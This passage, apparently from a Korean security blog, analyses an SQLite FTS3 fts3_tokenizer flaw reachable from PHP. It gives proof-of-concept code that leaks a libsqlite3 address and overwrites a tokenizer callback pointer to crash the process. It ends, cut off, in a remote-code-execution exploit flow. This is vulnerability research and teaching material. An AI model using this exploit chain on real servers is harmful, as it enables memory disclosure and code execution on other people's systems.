punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>취약한 부분의 쿼리를 PHP 코드로 작성하여 쿼리를 수행하여 메모리 릭을 진행합시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 502px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVQI123KzQ6CMBhE0Q80xo2KSilQSgui/AiuXPj+L3aNNe5cTCaTOZKcHFU9Yd0dY0dqP3NWDbq44pqFLO/ITY/SXdhp1gZr/Rxsqi8Upqe0IxLtkbIamJZXOH37CH0bnmy2CpEd0SpB4sMXf/pPfiZeH3kDitwye+jIRWAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png\"\n        srcset=\"/static/ece3868599479ae40e51537c45dfb6e1/e9ff0/6.png 180w,\n/static/ece3868599479ae40e51537c45dfb6e1/f21e7/6.png 360w,\n/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png 502w\"\n        sizes=\"(max-width: 502px) 100vw, 502px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>그렇다면, 해당 부분은 왜 메모리 릭이 가능하지 살펴봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">/* Load the built-in tokenizers into the hash table */</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">==</span><span class=\"token constant\">SQLITE_OK</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pSimple<span class=\"token punctuation\">)</span>\n     <span class=\"token operator\">||</span> <span class=\"token class-name\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"porter\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pPorter<span class=\"token punctuation\">)</span> \n     <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>pIcu <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"icu\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pIcu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      rc <span class=\"token operator\">=</span> <span class=\"token constant\">SQLITE_NOMEM</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> sqlite3_tokenizer_module simpleTokenizerModule <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n simpleCreate<span class=\"token punctuation\">,</span>\n simpleDestroy<span class=\"token punctuation\">,</span>\n simpleOpen<span class=\"token punctuation\">,</span>\n simpleClose<span class=\"token punctuation\">,</span>\n simpleNext<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">built-in tokenizer</code> 는 hash-table에 로드되며 해당 주소는 libsqlite3 의 .bss 섹션을 참조되고 있습니다.</li>\n</ul>\n<h3 id=\"sqlite-fts3_tokenizer-fts3_tokenizer\" style=\"position:relative;\"><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\" aria-label=\"sqlite fts3_tokenizer fts3_tokenizer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3_tokenizer(), fts3_tokenizer()</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;</span>sqlite3_tokenizer_module ptr<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>하나의 인수, 두 개의 인수로 fts3_tokenizer 함수를 호출할 수 있습니다. 첫 번째 인자는 해당 함수에서 <code class=\"language-text\">tokenizer</code>를 식별하는 문자열이며 <code class=\"language-text\">slqite3_tokenizer_module</code> 구조체에 대한 포인터입니다.</li>\n<li>즉, 하나의 인수가 전달되면 현재 등록된 tokenizer 구현에 대한 포인터가 반환되고 두 번째 인수는 tokenizer를 등록할 사본이 반환되어 집니다.</li>\n</ul>\n<h2 id=\"fts3-callback을-통한-임의의-코드-실행-취약점\" style=\"position:relative;\"><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"fts3 callback을 통한 임의의 코드 실행 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 callback을 통한 임의의 코드 실행 취약점</h2>\n<ul>\n<li>앞서 취약한 부분의 쿼리인 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 인자에 임의의 값을 입력한 경우 크래쉬가 발생한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1212</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select fts3_tokenizer('simple', x'4141414141414141');\n        create virtual table a using fts3(tokenizer=simple);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n</code></pre></div>\n<ul>\n<li>크래쉬가 발생한 부분을 분석해보면 <code class=\"language-text\">rbp</code> 레지스터 값이 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 파라미터인 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACH0lEQVQ4y5WTe3OaUBDFb9SoURAEAXnJQyHg+xk1PpMYTaYzneb7f5jTudsmjTNJ0/6xc2GA356ze2Cu18FossNydYTf7OMiK0NWGqjpISw3hVR16fqqbNCzTK7612KiZGO+PODu8B3D8RaXhRpsN4UX9KhJ0BqgIjvIXir/BiyLJkaTLW7XJ6SdG/rQMGPo9RZ6gxXC1hAlwQS7qNAHX0GZKDkEO5xeMJntSWHQHJDKTm9Jlr9SdQbk3QejNea3j4iTKQEtJ4FmtCBULDAm/h/wTeHxBcPxhoB+2CdgWeTAMtmlykhnxe2/1huQqxiMNlisjkg7c+TyKkwnIXVOo01gpRZA1QJqkC9qKJZ0Oj9UyDfIt/nw+IOW8GqZw9bbZ4yne1JuOSkBOZg34dH61PJ4usNq84Tu4JaAdSsmIM+naV+j4XdpUbRtPgIm0gg+tMxzOJvfY7v/RlvlQNNOCMoVzuYPaHcXuFkcaLZ8FLw+XQqPBQfu7n4B+Qw9vwvHTckq/5OEik3x4c0F0UKxZPzJJQe9V3glmBjP9lhunhC3Z8jmVWj1CLoZoTdao91bwrBiMCYgV6hBUhqo1gLIqgdGoPOgs8iOsZ7ucNo9Y5hMUMkrCK0IgRXRfeQmMKsu1LIBTTRRlx0qU3ZQyau/oe+Am/YUfb+DSPMRKg0YBZVOv+rAk2yEagO+7CDSAzRrHr3X0nxc6wGskgaWOQf+BFo6ZHwLayVXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"php_in.png\"\n        title=\"php_in.png\"\n        src=\"/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png\"\n        srcset=\"/static/895cf1cf65041b4a6f0abd6f963b6726/e9ff0/php_in.png 180w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/f21e7/php_in.png 360w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png 720w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/1cfc2/php_in.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>SQLite3가 <code class=\"language-text\">xCreate</code> callback function pointer를 호출하였고 이에 대한 Callback 호출에 대한 임계값 검증이 존재하지 않았기 때문에 발생하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_tokenizer.c</span>\nm <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_module <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">sqlite3Fts3HashFind</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>m <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer: %s\"</span><span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    rc <span class=\"token operator\">=</span> SQLITE_ERROR<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span>\n    rc <span class=\"token operator\">=</span> m<span class=\"token operator\">-></span><span class=\"token function\">xCreate</span><span class=\"token punctuation\">(</span>iArg<span class=\"token punctuation\">,</span> aArg<span class=\"token punctuation\">,</span> ppTok<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token operator\">||</span> <span class=\"token operator\">*</span>ppTok <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n      <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ppTok<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>pModule <span class=\"token operator\">=</span> m<span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">sqlite3_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>aArg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"xopen-취약점\" style=\"position:relative;\"><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xopen 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>xOpen 취약점</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> exploit <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span>x<span class=\"token string\">\"9090909090909090\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>현 쿼리의 “exploit” 테이블은 앞에서 create 쿼리문으로 생성이 된후 insert 쿼리문을 이용해서 데이터를 삽입할 경우 <code class=\"language-text\">xOpen</code> Callback function pointer가 수행됩니다.</li>\n<li><code class=\"language-text\">xOpen</code> 은 값 으로 0x9090909090909090 16진수를 <code class=\"language-text\">pInput1</code> 매개 변수로 사용하여 CallBack 과 같이 트리거 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_expr.c</span>\nsqlite3_tokenizer_module <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>pModule <span class=\"token operator\">=</span> pTokenizer<span class=\"token operator\">-></span>pModule<span class=\"token punctuation\">;</span>\nsqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCsr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> rc<span class=\"token punctuation\">;</span>\nrc <span class=\"token operator\">=</span> pModule<span class=\"token operator\">-></span><span class=\"token function\">xOpen</span><span class=\"token punctuation\">(</span>pTokenizer<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pCsr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>이를 이용해서 예측이 가능한 메모리 위치에 대상 주소를 만들고 메모리 주소에 있어 <code class=\"language-text\">fts3_tokenizer</code> 의 Callback 을 트리거하여 다음 프로그램 카운터를 조작해 원하는 파라미터 값을 컨트롤해 공격 연계가 가능합니다.</li>\n</ul>\n<h1 id=\"fts3-php-rce-exploitation\" style=\"position:relative;\"><a href=\"#fts3-php-rce-exploitation\" aria-label=\"fts3 php rce exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 PHP RCE Exploitation</h1>\n<h2 id=\"exploit-공격-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 공격 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 공격 흐름도</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">$sqlite3_lib_leaked_tokenizer <span class=\"token operator\">=</span> sqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select hex(fts3_tokenizer('simple')) addr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$libsqlite3_addr <span class=\"token operator\">=</span> flip<span class=\"token punctuation\">(</span>$sqlite3_lib_leaked_tokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$libsqlite3_base <span class=\"token operator\">=</span> $libsqlite3_addr <span class=\"token operator\">-</span> $leaked_simple_tokenizer_offset<span class=\"token punctuation\">;</span>\n\n$payload <span class=\"token operator\">=</span> <span class=\"token number\">0x9090909090909090</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// payload </span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select fts3_tokenizer('simple', ?);\"</span><span class=\"token punctuation\">,</span> $payload<span class=\"token punctuation\">)</span><span class=\"token 